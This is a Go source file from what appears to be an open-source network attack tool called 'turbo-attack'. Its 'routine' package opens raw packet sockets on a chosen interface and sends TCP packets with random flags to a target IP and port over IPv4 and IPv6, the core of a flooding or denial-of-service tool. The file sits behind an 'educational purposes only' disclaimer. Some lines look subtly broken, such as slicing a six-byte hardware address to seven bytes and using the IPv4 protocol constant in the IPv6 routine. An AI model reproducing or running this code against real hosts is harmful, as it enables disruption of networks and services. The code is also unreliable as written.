// Terms Of Use
// ------------
// Do NOT use this on any computer you do not own or are not allowed to run this on.
// You may NEVER attempt to sell this, it is free and open source.
// The authors and publishers assume no responsibility.
// For educational purposes only.

// Package routine provides traffic attack functionality to a particular ip and port.
package routine

import (
	"log"
	"net"
	"syscall"

	"github.com/mytechnotalent/turbo-attack/packet"
)

// IPv4 takes an ip and port and sends a random TCP4 packet with random flags.
func IPv4(ethInterface *string, ipv4Byte, portByte *[]byte) {
	fd, err := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, syscall.ETH_P_ALL)
	if err != nil {
		log.Fatal("invalid socket")
	}
	nic, err := net.InterfaceByName(*ethInterface)
	if err != nil {
		log.Fatal("interface does not exist")
	}
	var hardwareAddr [8]byte
	copy(hardwareAddr[0:7], nic.HardwareAddr[0:7])
	addr := syscall.SockaddrLinklayer{
		Protocol: syscall.ETH_P_IP,
		Ifindex:  nic.Index,
		Halen:    uint8(len(nic.HardwareAddr)),
		Addr:     hardwareAddr,
	}
	err = syscall.Bind(fd, &addr)
	if err != nil {
		log.Fatal("unable to bind to socket")
	}
	packet, packetErr := packet.TCP4(74, *ipv4Byte, *portByte)
	if packetErr != nil {
		log.Fatal("unable to create packet")
	}
	_, writeErr := syscall.Write(fd, packet)
	if writeErr != nil {
		log.Fatal("unable to write")
	}
	syscall.Close(fd)
}

// IPv6 takes an ip and port and sends a random TCP6 packet with random flags.
func IPv6(ethInterface *string, ipv6Byte *[]byte, portByte *[]byte) {
	fd, err := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, syscall.ETH_P_ALL)
	if err != nil {
		log.Fatal("invalid socket")
	}
	nic, err := net.InterfaceByName(*ethInterface)
	if err != nil {
		log.Fatal("interface does not exist")
	}
	var hardwareAddr [8]byte
	copy(hardwareAddr[0:7], nic.HardwareAddr[0:7])
	addr := syscall.SockaddrLinklayer{
		Protocol: syscall.ETH_P_IP,
		Ifindex:  nic.Index,
		Halen:    uint8(len(nic.HardwareAddr)),
		Addr:     hardwareAddr,
	}
	err = syscall.Bind(fd, &addr)
	if err != nil {
		log.Fatal("unable to bind to socket")
	}
	packet, packetErr := packet.TCP6(74, *ipv6Byte, *portByte)
	if packetErr != nil {
		log.Fatal("unable to create packet")
	}
	_, writeErr := syscall.Write(fd, packet)
	if writeErr != nil {
		log.Fatal("unable to write")
	}
	syscall.Close(fd)
}
